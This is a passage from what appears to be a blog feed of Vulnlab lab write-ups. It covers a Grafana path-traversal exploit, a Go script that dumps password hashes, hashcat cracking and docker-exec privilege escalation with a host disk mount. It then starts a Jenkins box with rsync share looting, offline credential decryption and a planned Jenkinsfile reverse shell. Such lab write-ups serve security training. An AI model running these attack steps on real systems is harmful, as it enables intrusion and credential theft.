class="keyword">return</span> pbkdf2.Key([]<span class="type">byte</span>(secret), []<span class="type">byte</span>(salt), <span class="number">10000</span>, <span class="number">32</span>, sha256.New), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="comment">// Replace &quot;your-database-path&quot; with the actual database path</span></span><br><span class="line">        db, err := sql.Open(<span class="string">&quot;sqlite3&quot;</span>, <span class="string">&quot;grafana.db&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                log.Fatalf(<span class="string">&quot;Error opening database: %v&quot;</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">defer</span> db.Close()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Prepare output file</span></span><br><span class="line">        hashFile, err := os.Create(<span class="string">&quot;hashes.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                log.Fatalf(<span class="string">&quot;Error creating file: %v&quot;</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">defer</span> hashFile.Close()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Query users from the database</span></span><br><span class="line">        rows, err := db.Query(<span class="string">&quot;SELECT email, password, salt, is_admin FROM user&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                log.Fatalf(<span class="string">&quot;Error executing query: %v&quot;</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">defer</span> rows.Close()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Process each row</span></span><br><span class="line">        <span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line">                <span class="keyword">var</span> email, password, salt <span class="type">string</span></span><br><span class="line">                <span class="keyword">var</span> isAdmin <span class="type">bool</span> <span class="comment">// Adjust type if necessary</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// Scan row data</span></span><br><span class="line">                <span class="keyword">if</span> err := rows.Scan(&amp;email, &amp;password, &amp;salt, &amp;isAdmin); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                        log.Printf(<span class="string">&quot;Error scanning row: %v&quot;</span>, err)</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Decode password hash</span></span><br><span class="line">                decodedHash, err := hex.DecodeString(password)</span><br><span class="line">                <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                        log.Printf(<span class="string">&quot;Error decoding password for user %s: %v&quot;</span>, email, err)</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Base64 encode password and salt</span></span><br><span class="line">                hash64 := base64.StdEncoding.EncodeToString(decodedHash)</span><br><span class="line">                salt64 := base64.StdEncoding.EncodeToString([]<span class="type">byte</span>(salt))</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Write to file</span></span><br><span class="line">                line := fmt.Sprintf(<span class="string">&quot;sha256:10000:%s:%s\n&quot;</span>, salt64, hash64)</span><br><span class="line">                <span class="keyword">if</span> _, err := hashFile.WriteString(line); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                        log.Printf(<span class="string">&quot;Error writing to file: %v&quot;</span>, err)</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check for any errors during iteration</span></span><br><span class="line">        <span class="keyword">if</span> err := rows.Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                log.Fatalf(<span class="string">&quot;Error during row iteration: %v&quot;</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        log.Println(<span class="string">&quot;Processing completed successfully.&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>After that, using <code>hashcat</code> to retrieve the password</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Data~10.10.102.141/grafanahash$ hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>Using the password, successfully logged into the website, but nothing interesting in it.</p>
<p>Possibility of user <code>Boris</code> reusing the password, therefore try SSH into the user</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">muyi@mag3:~$ ssh boris@<span class="variable">$ip</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.102.141 (10.10.102.141)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:iNi0vYwM4g6gqjPUqyj4779xFjwk17h4SIgcAv7F57Q.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.102.141<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">boris@10.10.102.141&#x27;</span>s password:</span><br><span class="line">Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1060-aws x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Fri Jan 24 07:57:07 UTC 2025</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Processes:              99</span><br><span class="line">  Usage of /:   19.8% of 7.69GB   Users logged <span class="keyword">in</span>:        0</span><br><span class="line">  Memory usage: 25%               IP address <span class="keyword">for</span> eth0:    10.10.102.141</span><br><span class="line">  Swap usage:   0%                IP address <span class="keyword">for</span> docker0: 172.17.0.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Sun Jan 23 13:11:53 2022 from 10.10.1.254</span><br><span class="line">boris@ip-10-10-10-11:~$ <span class="built_in">ls</span></span><br><span class="line">snap  user.txt</span><br><span class="line">boris@ip-10-10-10-11:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">VL&#123;********&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>Running basic privilege checking and notice that <code>Boris</code> can use <code>docker exec *</code> as sudo</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">boris@ip-10-10-10-11:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> boris on ip-10-10-10-11:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User boris may run the following commands on ip-10-10-10-11:</span><br><span class="line">    (root) NOPASSWD: /snap/bin/docker <span class="built_in">exec</span> *</span><br></pre></td></tr></table></figure></div>

<br>

<p>also learn that the website just now was running in docker, that’s why user <code>Grafana</code> was showed in <code>/etc/passwd</code> while using the directory traversal.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>/etc/passwd</span></figcaption><table><tr><td class="code"><pre><span class="line">boris@ip-10-10-10-11:~$ <span class="built_in">cat</span> /etc/passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">lxd:x:105:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">sshd:x:109:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">pollinate:x:110:1::/var/cache/pollinate:/bin/false</span><br><span class="line">ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash</span><br><span class="line">boris:x:1001:1001:,,,:/home/boris:/bin/bash</span><br></pre></td></tr></table></figure></div>

<p>Therefore, need to use <code>docker exec</code> to get into docker &amp; run as root</p>
<br>

<p>There are a few ways to use <code>docker exec</code>:</p>
<ol>
<li>get the container ID of the docker using ‘docker ps’ which seems to be impossible as it requires &#x3D;&#x3D;root privilege&#x3D;&#x3D;, but its still possible to get it via the directory traversal from the Grafana vulnerability.</li>
</ol>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">boris@ip-10-10-10-11:~$ docker ps</span><br><span class="line">Got permission denied <span class="keyword">while</span> trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get <span class="string">&quot;http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json&quot;</span>: dial unix /var/run/docker.sock: connect: permission denied</span><br><span class="line"></span><br><span class="line">             ------------------------------------ directory traversal --------------------------------------</span><br><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Data~10.10.102.141/grafanahash$ curl --path-as-is http://<span class="variable">$ip</span>:3000/public/plugins/zipkin/../../../../../../../../etc/hostname</span><br><span class="line">e6ff5b1cbc85 [Container ID]</span><br><span class="line"></span><br><span class="line">                  ------------------------------------ docker <span class="built_in">exec</span> ------------------------------------</span><br><span class="line">boris@ip-10-10-10-11:~$ <span class="built_in">sudo</span> /snap/bin/docker <span class="built_in">exec</span> --privileged -it -u 0 e6ff5b1cbc85 /bin/bash</span><br><span class="line">bash-5.1# <span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>use the username retrieved from the <code>/etc/passwd</code> recovered from the directory traversal before.</li>
</ol>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[from the /etc/passwd <span class="keyword">in</span> directory traversal]</span><br><span class="line">grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin</span><br><span class="line"></span><br><span class="line">boris@ip-10-10-10-11:~$ <span class="built_in">sudo</span> /snap/bin/docker <span class="built_in">exec</span> --privileged -it -u 0 grafana /bin/bash</span><br><span class="line">bash-5.1# <span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure></div>

<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>Using <code>fdisk -l</code>, revelas <code>/dev/xvda/</code> disk, showing it’s an 8GB disk with a single Linux partition <code>/dev/xvda1</code>. Suggesting device is reachable from within the docker. Therefore, <code>mount</code> is possible.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">bash-5.1# fdisk -l</span><br><span class="line">Disk /dev/xvda: 8192 MB, 8589934592 bytes, 16777216 sectors</span><br><span class="line">6367 cylinders, 85 heads, 31 sectors/track</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line"></span><br><span class="line">Device   Boot StartCHS    EndCHS        StartLBA     EndLBA    Sectors  Size Id Type</span><br><span class="line">/dev/xvda1 *  0,32,33     20,84,31          2048   16777182   16775135 8190M 83 Linux</span><br></pre></td></tr></table></figure></div>

<p>Create a dummy directory and <code>mount</code> <code>/dev/xvda1</code> to the directory created and get access to <code>/root/</code> content.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">bash-5.1# <span class="built_in">pwd</span></span><br><span class="line">/usr/share/grafana</span><br><span class="line">bash-5.1# <span class="built_in">mkdir</span> mntroot</span><br><span class="line">bash-5.1# mount /dev/xvda1 ./mntroot/</span><br><span class="line">bash-5.1# <span class="built_in">ls</span></span><br><span class="line">LICENSE          README.md        bin              plugins-bundled  mntroot</span><br><span class="line">NOTICE.md        VERSION          conf             public           scripts</span><br><span class="line">bash-5.1# <span class="built_in">cd</span> mntroot</span><br><span class="line">bash-5.1# <span class="built_in">ls</span></span><br><span class="line">bin             home            lib64           opt             sbin            tmp             vmlinuz.old</span><br><span class="line">boot            initrd.img      lost+found      proc            snap            usr</span><br><span class="line">dev             initrd.img.old  media           root            srv             var</span><br><span class="line">etc             lib             mnt             run             sys             vmlinuz</span><br><span class="line">bash-5.1# <span class="built_in">cd</span> root</span><br><span class="line">bash-5.1# <span class="built_in">ls</span></span><br><span class="line">root.txt  snap</span><br><span class="line">bash-5.1# <span class="built_in">cat</span> root.txt</span><br><span class="line">VL&#123;*****&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-data/data-pwn.png"
                      alt="pwn"
                ></p>
]]></content>
      <tags>
        <tag>Vulnlab</tag>
        <tag>Easy</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnlab-Build</title>
    <url>/2025/01/21/Vulnlab-Build/</url>
    <content><![CDATA[<h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Starting off with enumeration via nmap</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.94SVN scan initiated Tue Jan 21 14:01:27 2025 as: /usr/lib/nmap/nmap --privileged -p22,53,512,513,514,873,3000,3306,8081 -sVC -o detailed-nmap 10.10.91.238</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.91.238</span><br><span class="line">Host is up (0.26s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE         VERSION</span><br><span class="line">22/tcp   open     ssh             OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 47:21:73:e2:6b:96:<span class="built_in">cd</span>:f9:13:11:af:40:c8:4d:d6:7f (ECDSA)</span><br><span class="line">|_  256 2b:5e:ba:f3:72:d3:b3:09:<span class="built_in">df</span>:25:41:29:09:f4:7b:f5 (ED25519)</span><br><span class="line">53/tcp   open     domain          PowerDNS</span><br><span class="line">| dns-nsid:</span><br><span class="line">|   NSID: pdns (70646e73)</span><br><span class="line">|_  id.server: pdns</span><br><span class="line">512/tcp  open     <span class="built_in">exec</span>            netkit-rsh rexecd</span><br><span class="line">513/tcp  open     login?</span><br><span class="line">514/tcp  open     shell           Netkit rshd</span><br><span class="line">873/tcp  open     rsync           (protocol version 31)</span><br><span class="line">3000/tcp open     ppp?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   GenericLines, Help, RTSPRequest:</span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Cache-Control: max-age=0, private, must-revalidate, no-transform</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Set-Cookie: i_like_gitea=397215be2dc19d68; Path=/; HttpOnly; SameSite=Lax</span><br><span class="line">|     Set-Cookie: _csrf=6PYEuSMgLPwPqsx2wkbFnPSe0rM6MTczNzQzOTI5NzA5OTQyOTE0Ng; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax</span><br><span class="line">|     X-Frame-Options: SAMEORIGIN</span><br><span class="line">|     Date: Tue, 21 Jan 2025 06:01:37 GMT</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=<span class="string">&quot;en-US&quot;</span> class=<span class="string">&quot;theme-auto&quot;</span>&gt;</span><br><span class="line">|     &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">|     &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="line">|     &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt;</span><br><span class="line">|     &lt;<span class="built_in">link</span> rel=<span class="string">&quot;manifest&quot;</span> href=<span class="string">&quot;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ</span></span><br><span class="line"><span class="string">|   HTTPOptions:</span></span><br><span class="line"><span class="string">|     HTTP/1.0 405 Method Not Allowed</span></span><br><span class="line"><span class="string">|     Allow: HEAD</span></span><br><span class="line"><span class="string">|     Allow: GET</span></span><br><span class="line"><span class="string">|     Cache-Control: max-age=0, private, must-revalidate, no-transform</span></span><br><span class="line"><span class="string">|     Set-Cookie: i_like_gitea=e93f48db281435f5; Path=/; HttpOnly; SameSite=Lax</span></span><br><span class="line"><span class="string">|     Set-Cookie: _csrf=hAGDEKfB-4syaBacozyXvBWfiw06MTczNzQzOTMwMzQ1MDY5MTU1OQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax</span></span><br><span class="line"><span class="string">|     X-Frame-Options: SAMEORIGIN</span></span><br><span class="line"><span class="string">|     Date: Tue, 21 Jan 2025 06:01:43 GMT</span></span><br><span class="line"><span class="string">|_    Content-Length: 0</span></span><br><span class="line"><span class="string">3306/tcp filtered mysql</span></span><br><span class="line"><span class="string">8081/tcp filtered blackice-icecap</span></span><br><span class="line"><span class="string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span></span><br><span class="line"><span class="string">SF-Port3000-TCP:V=7.94SVN%I=7%D=1/21%Time=678F3841%P=x86_64-pc-linux-gnu%r</span></span><br><span class="line"><span class="string">SF:(GenericLines,67,&quot;</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x</span><br><span class="line">SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba</span><br><span class="line">SF:d\x20Request<span class="string">&quot;)%r(GetRequest,1000,&quot;</span>HTTP/1\.0\x20200\x20OK\r\nCache-Contr</span><br><span class="line">SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo</span><br><span class="line">SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git</span><br><span class="line">SF:ea=397215be2dc19d68;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo</span><br><span class="line">SF:kie:\x20_csrf=6PYEuSMgLPwPqsx2wkbFnPSe0rM6MTczNzQzOTI5NzA5OTQyOTE0Ng;\x</span><br><span class="line">SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt</span><br><span class="line">SF:ions:\x20SAMEORIGIN\r\nDate:\x20Tue,\x2021\x20Jan\x202025\x2006:01:37\x</span><br><span class="line">SF:20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&quot;en-US\&quot;\x20class=\&quot;the</span><br><span class="line">SF:me-auto\&quot;&gt;\n&lt;<span class="built_in">head</span>&gt;\n\t&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=dev</span><br><span class="line">SF:ice-width,\x20initial-scale=1\&quot;&gt;\n\t&lt;title&gt;Gitea:\x20Git\x20with\x20a\x</span><br><span class="line">SF:20cup\x20of\x20tea&lt;/title&gt;\n\t&lt;<span class="built_in">link</span>\x20rel=\&quot;manifest\&quot;\x20href=\&quot;data:</span><br><span class="line">SF:application/json;<span class="built_in">base64</span>,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHR</span><br><span class="line">SF:lYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3Rhcn</span><br><span class="line">SF:RfdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6L</span><br><span class="line">SF:y9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5n</span><br><span class="line">SF:Iiwic2l6ZXMiOiI1MTJ<span class="string">&quot;)%r(Help,67,&quot;</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\n</span><br><span class="line">SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r</span><br><span class="line">SF:\n\r\n400\x20Bad\x20Request<span class="string">&quot;)%r(HTTPOptions,197,&quot;</span>HTTP/1\.0\x20405\x20Me</span><br><span class="line">SF:thod\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Cont</span><br><span class="line">SF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nS</span><br><span class="line">SF:et-Cookie:\x20i_like_gitea=e93f48db281435f5;\x20Path=/;\x20HttpOnly;\x2</span><br><span class="line">SF:0SameSite=Lax\r\nSet-Cookie:\x20_csrf=hAGDEKfB-4syaBacozyXvBWfiw06MTczN</span><br><span class="line">SF:zQzOTMwMzQ1MDY5MTU1OQ;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20Sam</span><br><span class="line">SF:eSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Tue,\x2021\x20J</span><br><span class="line">SF:an\x202025\x2006:01:43\x20GMT\r\nContent-Length:\x200\r\n\r\n<span class="string">&quot;)%r(RTSPR</span></span><br><span class="line"><span class="string">SF:equest,67,&quot;</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/</span><br><span class="line">SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re</span><br><span class="line">SF:quest<span class="string">&quot;);</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string"># Nmap done at Tue Jan 21 14:03:18 2025 -- 1 IP address (1 host up) scanned in 110.69 seconds</span></span><br></pre></td></tr></table></figure></div>
<h3 id="Gitea-Jenkins"><a href="#Gitea-Jenkins" class="headerlink" title="Gitea &amp; Jenkins"></a>Gitea &amp; Jenkins</h3><p>Port 3000 hosting self-hosted github –&gt; Gitea, visit the website and access the public repositories without any authentication required.<br>Discovered Jenkinsfile, which defines Jenkins pipeline<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-build/jenkinsfile.png"
                      alt="jenkinsfile"
                ></p>
<blockquote>
<p>with jenkinsfile, its possible for an attacker to modify it and trigger remote code execution which opens up a vulnerability.</p>
<p>To do this, edit the <code>Jenkinfiles</code> to include a reverse shell and push it to the repository to trigger the pipeline and generate a shell on the internally-faced Jenkins server, while authenticated that is.</p>
</blockquote>
<h3 id="Rsync"><a href="#Rsync" class="headerlink" title="Rsync"></a>Rsync</h3><p>using rsync to read shares without credentials</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Build~10.10.91.238$ rsync -av --list-only rsync://<span class="variable">$ip</span></span><br><span class="line">backups         backups</span><br><span class="line"></span><br><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Build~10.10.91.238$ rsync -av --list-only rsync://<span class="variable">$ip</span>/backups</span><br><span class="line">receiving incremental file list</span><br><span class="line">drwxr-xr-x          4,096 2024/05/02 21:26:31 .</span><br><span class="line">-rw-r--r--    376,289,280 2024/05/02 21:26:19 jenkins.tar.gz</span><br><span class="line"></span><br><span class="line">sent 24 bytes  received 82 bytes  30.29 bytes/sec</span><br><span class="line">total size is 376,289,280  speedup is 3,549,898.87</span><br></pre></td></tr></table></figure></div>

<p>after downloading the <code>backups</code> containing <code>jenkins.tar.gz</code>, unzip it and inspect it</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Build~10.10.91.238/backups$ tar -xvf jenkins.tar.gz</span><br><span class="line">jenkins_configuration/</span><br><span class="line">jenkins_configuration/jenkins.model.ArtifactManagerConfiguration.xml</span><br><span class="line">jenkins_configuration/hudson.plugins.git.GitTool.xml</span><br><span class="line">jenkins_configuration/secrets/</span><br><span class="line">jenkins_configuration/secrets/master.key</span><br><span class="line">jenkins_configuration/secrets/hudson.util.Secret</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>running the following preg, we discovered the encrypted password</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">(.venv) muyi@mag3:~/Desktop/vulnlab/easy/Build~10.10.91.238$ grep -re <span class="string">&quot;^\s*&lt;[a-zA-Z]*&gt;&#123;[a-zA-Z0-9=+/]*&#125;&lt;&quot;</span></span><br><span class="line">backups/jenkins_configuration/jobs/build/config.xml:              &lt;password&gt;&#123;AQAAABAAAAAQUNBJaKiUQNaRbPI0/VMwB1cmhU/EHt0chpFEMRLZ9v0=&#125;&lt;/password&gt;</span><br></pre></td></tr></table></figure></div>
<h3 id="Cracking-jenkins"><a href="#Cracking-jenkins" class="headerlink" title="Cracking jenkins"></a>Cracking jenkins</h3><p>with that being discovered, we can now use <code>jenkins_offline_decrypt.py</code> from this github [<a class="link"   href="https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py]" >https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py]<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> to retrieve the password and proceed with the pipeline exploitation.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">(.venv) muyi@mag3:~/Desktop/vulnlab/easy/Build~10.10.91.238$ python3 jenkins_offline_decrypt.py ./backups/jenkins_configuration/secrets/master.key ./backups/jenkins_configuration/secrets/hudson.util.Secret ./backups/jenkins_configuration/jobs/build/config.xml</span><br><span class="line">/home/muyi/Desktop/vulnlab/easy/Build~10.10.91.238/jenkins_offline_decrypt.py:124: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\&#123;&#x27;</span></span><br><span class="line">  secrets += re.findall(secret_title + <span class="string">&#x27;&gt;\&#123;?(.*?)\&#125;?&lt;/&#x27;</span> + secret_title, data)</span><br><span class="line">Git1234!</span><br></pre></td></tr></table></figure></div>
